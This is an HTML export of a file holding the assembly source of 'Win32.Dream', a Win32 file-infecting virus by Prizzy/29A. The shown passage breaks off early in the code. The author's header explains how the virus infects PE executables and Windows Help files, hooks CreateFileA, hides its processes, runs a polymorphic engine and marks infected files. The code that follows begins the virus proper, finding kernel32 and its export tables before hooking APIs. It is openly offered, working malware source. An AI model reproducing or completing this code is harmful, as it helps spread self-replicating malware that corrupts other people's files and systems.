<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  : Prizzy/29A :         Win32.Dream             : Prizzy/29A :</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Hello people, here is my third virus especially when it is designed for</span><span class="sc0">
</span><span class="sc1">;   whole Win32  platform. It  infects  only EXE (PE - Portable Executable)</span><span class="sc0">
</span><span class="sc1">;   files and also HLP (Windows Help File Format).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When infected EXE file is started, EIP goes through my easy polymorphic</span><span class="sc0">
</span><span class="sc1">;   engine, which isn't so important in this virus, then  hooks CreateFileA</span><span class="sc0">
</span><span class="sc1">;   function, installs itself  into memory and only  then it can put EIP to</span><span class="sc0">
</span><span class="sc1">;   the host - there're two returns, one for EXE the other for HLP files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   With might and mind I wanted to use only it the best from new high-tech</span><span class="sc0">
</span><span class="sc1">;   vx methods we know. And I think is nothing worst than virus equipped of</span><span class="sc0">
</span><span class="sc1">;   interprocess communication (IPC). I also changed my coding style and</span><span class="sc0">
</span><span class="sc1">;   this source is most optimization as I could.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                Detailed Information</span><span class="sc0">
</span><span class="sc1">;               ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1. Interprocess Communication (IPC)</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   You could see one IPC virus (Vulcano) by Benny/29A but I used this fea-</span><span class="sc0">
</span><span class="sc1">;   ture other way than he. His IPC virus is only in one process and it can</span><span class="sc0">
</span><span class="sc1">;   communicate with others viruses in another process.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The parts of my Win32.Dream virus work in several processes and in fact</span><span class="sc0">
</span><span class="sc1">;   it behades like one whole virus. After installing to memory, virus will</span><span class="sc0">
</span><span class="sc1">;   remove itself from memory of the infected program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.1. Creating processes</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   This virus is divided into seven 'independent' functions which have own</span><span class="sc0">
</span><span class="sc1">;   process. To create new process I would build a dropper and via the Cre-</span><span class="sc0">
</span><span class="sc1">;   ateProcessA I would run them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The dropper wait than new function for its process is ready, if yes, it</span><span class="sc0">
</span><span class="sc1">;   shares two mapped blocks (OpenFileMappingA) for that process (it's Glo-</span><span class="sc0">
</span><span class="sc1">;   bal memory and Function's body) and creates thread on the function. The</span><span class="sc0">
</span><span class="sc1">;   process can't terminate it  can only Sleep.  All created  processed are</span><span class="sc0">
</span><span class="sc1">;   hiden in Windows 95, not in WinNT/2k (is't more complex).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.2. IPC in action</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Hooked CreateFileA functions  retrieves control, sets  flag for certain</span><span class="sc0">
</span><span class="sc1">;   process and awakes its. That process  finishes own task and returns re-</span><span class="sc0">
</span><span class="sc1">;   sults.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.3. Global memory</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   It's necessary to share some important information among all processes.</span><span class="sc0">
</span><span class="sc1">;   There are:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      + [thandle]    : When the dropper will create new thread here is re-</span><span class="sc0">
</span><span class="sc1">;           turned handle. It indicates the thread's errorcode.</span><span class="sc0">
</span><span class="sc1">;      + [th_mempos]  : Here is stored the name of the Function's mapped</span><span class="sc0">
</span><span class="sc1">;           object. The dropper will open that memory area.</span><span class="sc0">
</span><span class="sc1">;      + [process]    : hProcess, ProcessID values of the all created pro-</span><span class="sc0">
</span><span class="sc1">;           cesses because of opening/runing them.</span><span class="sc0">
</span><span class="sc1">;      + [apiz]       : The addresses of the all APIz I call are on this</span><span class="sc0">
</span><span class="sc1">;           place.</span><span class="sc0">
</span><span class="sc1">;      + [active]     : If other process wants to run me, sets certain flag</span><span class="sc0">
</span><span class="sc1">;           here and the thread tests it.</span><span class="sc0">
</span><span class="sc1">;      + [paramz]     : This is place where the virus store some parameters</span><span class="sc0">
</span><span class="sc1">;           among processes (see below).</span><span class="sc0">
</span><span class="sc1">;      + [vbody]      : Here is the copy of the virus, useful for changing</span><span class="sc0">
</span><span class="sc1">;           values inside and for poly engine.</span><span class="sc0">
</span><span class="sc1">;      + [filename]   : The future infected filename. New CreateFileA func-</span><span class="sc0">
</span><span class="sc1">;           tion stores the name here.</span><span class="sc0">
</span><span class="sc1">;      + [cinfected]  : Two FPU memory buffers, one for creating of the in-</span><span class="sc0">
</span><span class="sc1">;           fection mark the other for checking.</span><span class="sc0">
</span><span class="sc1">;      + [poly_vbody] : Output from polymorphic engine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.4. Parameters</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   As I wrote above I have to get some parameters of the input processes.</span><span class="sc0">
</span><span class="sc1">;   Here is the description of them:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      + [1st param] : Out of polymorhpic engine, the new size of the virus</span><span class="sc0">
</span><span class="sc1">;      + [2nd param] : Filesize for checksum (+poly size yet).</span><span class="sc0">
</span><span class="sc1">;      + [3rd param] : The name of the mapped file (for OpenFileMappingA).</span><span class="sc0">
</span><span class="sc1">;      + [4th param] : a. Filesize for check_infected (without poly size).</span><span class="sc0">
</span><span class="sc1">;              b. Out of checksum.</span><span class="sc0">
</span><span class="sc1">;      + [5th param] : Input for check_infected, if '1', then it wants to</span><span class="sc0">
</span><span class="sc1">;              get an angle for create_infected.</span><span class="sc0">
</span><span class="sc1">;      + [6th param] : Terminate all processes ? (WinNT/2000 only)</span><span class="sc0">
</span><span class="sc1">;      + [7th param] : Terminate all processes ? (Win95/98   only)</span><span class="sc0">
</span><span class="sc1">;              (because of Win95/98 kernel bug)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.5. Termination of the all processes</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I remember it was a nut for me but of course I'd to solve it.  At first</span><span class="sc0">
</span><span class="sc1">;   I changed flags of the process (SetErrorMode, it means, the process 'll</span><span class="sc0">
</span><span class="sc1">;   not show any message box if it will do bad instructions), then I had to</span><span class="sc0">
</span><span class="sc1">;   check if the host lives yet. In Win95/98 I have discovered a kernel bug</span><span class="sc0">
</span><span class="sc1">;   so that I couldn't use WinNT version (OpenProcess) to check if the host</span><span class="sc0">
</span><span class="sc1">;   still exists because Win95/98 don't delete its process id handle.</span><span class="sc0">
</span><span class="sc1">;   Win95 - you can only read some value the from allocated memory by host.</span><span class="sc0">
</span><span class="sc1">;   WinNT - that allocated memory is opened by other process, you can't</span><span class="sc0">
</span><span class="sc1">;       identify if the host still exists.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.6. The scheme of the all processes</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»</span><span class="sc0">
</span><span class="sc1">;    ³           new CreateFileA API function           ³</span><span class="sc0">
</span><span class="sc1">;    ÈÍÄÄÄÄÑÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼</span><span class="sc0">
</span><span class="sc1">;      ³</span><span class="sc0">
</span><span class="sc1">;   ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÍ»</span><span class="sc0">
</span><span class="sc1">;   ³  infect file  ³   ÉÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ»</span><span class="sc0">
</span><span class="sc1">;   ÈÍÄÑÄÄÄÄÄÄÄÄÄÄÄÍ¼   ÚÄÄÄ   infect HLP   ³</span><span class="sc0">
</span><span class="sc1">;      ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÈÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ¼</span><span class="sc0">
</span><span class="sc1">;      ³</span><span class="sc0">
</span><span class="sc1">;      ³   ÉÍÄÄÄÄÄÄÄÄÍ»</span><span class="sc0">
</span><span class="sc1">;      ³   º      º    ÚÄÄ [check_infected]</span><span class="sc0">
</span><span class="sc1">;      ³   ³      ÃÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;      ³   ³  infect  ÃÄÄÄÄÅÄÄÄÄÄÄ [poly_engine]</span><span class="sc0">
</span><span class="sc1">;      ÀÄÄÄ      ³    ³</span><span class="sc0">
</span><span class="sc1">;          ³   EXE    ÃÄÄÄÄÅÄÄÄÄÄÄ [create_infected]</span><span class="sc0">
</span><span class="sc1">;          ³      ÃÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;          º      º    ÀÄÄ [checksum]</span><span class="sc0">
</span><span class="sc1">;          ÈÍÄÄÄÄÄÄÄÄÄ¼</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   2. Optimalization and comments</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Sometimes I heard my last virus Win32.Crypto is too huge and  also some</span><span class="sc0">
</span><span class="sc1">;   people had a fun from  me (benny, mort - gotcha bastards!) that my next</span><span class="sc0">
</span><span class="sc1">;   virus will be bigger than one megabyte. I wanted to  optimize  next one</span><span class="sc0">
</span><span class="sc1">;   and I've not told them it so I think it'll be  surprise for them I pro-</span><span class="sc0">
</span><span class="sc1">;   ved. Nevertheless I've a taste of the second side and  now I can return</span><span class="sc0">
</span><span class="sc1">;   myself without any major problems. But now  I can say the virus is more</span><span class="sc0">
</span><span class="sc1">;   optimization than benny's bits and pieces. The source  code is not com-</span><span class="sc0">
</span><span class="sc1">;   mented enough because I think no many  people will taste something like</span><span class="sc0">
</span><span class="sc1">;   IPC is. If yes, they can contact me.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   3. Check infected routine</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Long ago in Win32.Crypto I tasted to use  unique math technique  how to</span><span class="sc0">
</span><span class="sc1">;   check if the file is infected. Now I  thought up new more  complex way.</span><span class="sc0">
</span><span class="sc1">;   At first from infected file I'll compile the equation, for example:</span><span class="sc0">
</span><span class="sc1">;           y = 32*x^7 + 192*x^3 - 8212*x^5 - 72*x</span><span class="sc0">
</span><span class="sc1">;   and I'll get two points on that curve, for example x1=4 and x2=7.  Then</span><span class="sc0">
</span><span class="sc1">;   I will calculate  what angle is between the  tangents to the curve from</span><span class="sc0">
</span><span class="sc1">;   that two points, it  means: I have to  calculate derivation y' of  that</span><span class="sc0">
</span><span class="sc1">;   equation and if I know y=x1 and y=x2 then I will determine:</span><span class="sc0">
</span><span class="sc1">;        &amp; = arc tg | log(x1 - x2) - log(1 + x1*x2) |</span><span class="sc0">
</span><span class="sc1">;   If the angle will be greater e.g. than 75 degree, file is infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   This algorithm has been coded only for fun so that I know we've  easier</span><span class="sc0">
</span><span class="sc1">;   methods but I couldn't call to remembrance on any.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   4. Pearls behind the scene</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   * Only two weeks before release I've think the virus name up at last.</span><span class="sc0">
</span><span class="sc1">;   * At a time, during coding, I stopped writing and this virus  I haven't</span><span class="sc0">
</span><span class="sc1">;     coded for two months. Later when I started again I  couldn't remember</span><span class="sc0">
</span><span class="sc1">;     what that code does and so on.</span><span class="sc0">
</span><span class="sc1">;   * In present exists over than fifty backup copies.</span><span class="sc0">
</span><span class="sc1">;   * The worst part of the virus was the dropper, there were  many changes</span><span class="sc0">
</span><span class="sc1">;     because of Win9x and WinNT compatibility; many bugs were there.</span><span class="sc0">
</span><span class="sc1">;   * After a hour of the coding I unwillingly deleted new version. So that</span><span class="sc0">
</span><span class="sc1">;     I'd to save more than one gigabytes from FAT32 on another  hard disk.</span><span class="sc0">
</span><span class="sc1">;     Only there I found that lost version.</span><span class="sc0">
</span><span class="sc1">;   * The best thing I like on the whole virus is main comment.</span><span class="sc0">
</span><span class="sc1">;   * Working directory was 'E:\X_WIN\' and this file name was 'WIN.AS!'.</span><span class="sc0">
</span><span class="sc1">;   * Last week I was looking for help on mirc</span><span class="sc0">
</span><span class="sc1">;   &lt;prizzy&gt; i used also OpenFileMapping, but I think yes; if ...</span><span class="sc0">
</span><span class="sc1">;   &lt;Bumblebee&gt; mmm</span><span class="sc0">
</span><span class="sc1">;   &lt;Bumblebee&gt; OpenFileMapping?</span><span class="sc0">
</span><span class="sc1">;   &lt;prizzy&gt; yes :)</span><span class="sc0">
</span><span class="sc1">;   &lt;Bumblebee&gt; i've never used it         [bumble~1.log, 18:59:17]</span><span class="sc0">
</span><span class="sc1">;     ...but much help I haven't found there (although Bumblebee helped</span><span class="sc0">
</span><span class="sc1">;     me with another bug).</span><span class="sc0">
</span><span class="sc1">;   * During whole coding I've read five books and three film scripts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   5. List of greetings</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     Darkman          The master of the good optimistic mood</span><span class="sc0">
</span><span class="sc1">;     Bumblebee        Thanks for your help during coding</span><span class="sc0">
</span><span class="sc1">;     Billy Belcebu    So, our communication has started yet</span><span class="sc0">
</span><span class="sc1">;     GriYo        All the time busy man</span><span class="sc0">
</span><span class="sc1">;     Lord Julus       Waiting for your new virus and its meta engine</span><span class="sc0">
</span><span class="sc1">;     Mort         So did you think this source will be bigger then</span><span class="sc0">
</span><span class="sc1">;              one megabytes? Sorry, maybe later :).</span><span class="sc0">
</span><span class="sc1">;     J.P.         I look forward on future with you, dude.</span><span class="sc0">
</span><span class="sc1">;     Ratter           No, no. Stop reading and let you show us what you</span><span class="sc0">
</span><span class="sc1">;              are hiding inside.</span><span class="sc0">
</span><span class="sc1">;     VirusBuster      Here is that secret bin with savage poly engine as</span><span class="sc0">
</span><span class="sc1">;              you wrote on #virus.</span><span class="sc0">
</span><span class="sc1">;     Benny        It the best in the end, benny. Haha, at last this</span><span class="sc0">
</span><span class="sc1">;              source is optimized and you will stop to worry me.</span><span class="sc0">
</span><span class="sc1">;              Thanks for all you have e'er done for me.</span><span class="sc0">
</span><span class="sc1">;     ...and for flush, asmodeus, mlapse, mgl, f0re and evul.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   6. Contact me</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     prizzy@coderz.net</span><span class="sc0">
</span><span class="sc1">;     http://prizzy.cjb.net</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   (c)oded by Prizzy/29A, June 2000</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


        </span><span class="sc2">.486p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">
        </span><span class="sc5">locals</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">mz.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">pe.inc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">vstart</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;get delta</span><span class="sc0">
    </span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">file_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc5">inf_ep</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ha_module</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">fg0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc5">org_ep</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;get startup address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_k32_apis</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">
    </span><span class="sc5">@anti_e</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_st</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_resident</span><span class="sc0">          </span><span class="sc1">;try to create it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_process_maps</span><span class="sc0">
    </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">error</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hookapi</span><span class="sc0">
    </span><span class="sc9">.endif</span><span class="sc0">

    </span><span class="sc5">__return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;exe back</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;hlp back</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">vstart</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_k32_apis</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">48</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;find k32 address</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> !</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gk32a_f_a</span><span class="sc0">
    </span><span class="sc9">.endif</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__return</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get k32 tables</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
